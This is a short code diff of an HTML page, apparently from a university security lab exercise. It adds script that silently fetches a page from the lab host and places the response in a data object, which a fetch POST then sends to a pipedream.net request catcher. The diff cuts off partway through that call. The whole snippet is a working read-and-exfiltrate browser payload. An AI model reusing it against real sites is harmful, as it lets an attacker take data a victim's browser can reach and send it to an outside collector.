@@ -8,8 +8,15 @@
 </head>
 <body>
     <img src="https://picsum.photos/200/300" alt="" style="width:200px;height:300px;">
-     <script>
-        let data = { element: "hello" };
+    <script>
+        function httpGet(theUrl) {
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open("GET", theUrl, false); // false for synchronous request
+            xmlHttp.send(null);
+            return xmlHttp.responseText;
+        }
+
+        let data = { element: httpGet("https://t8.itsec.sec.in.tum.de/") };
         fetch("https://en3j2vox44988.x.pipedream.net/", {
             method: "POST",
             headers: { 'Content-Type': 'application/json' },
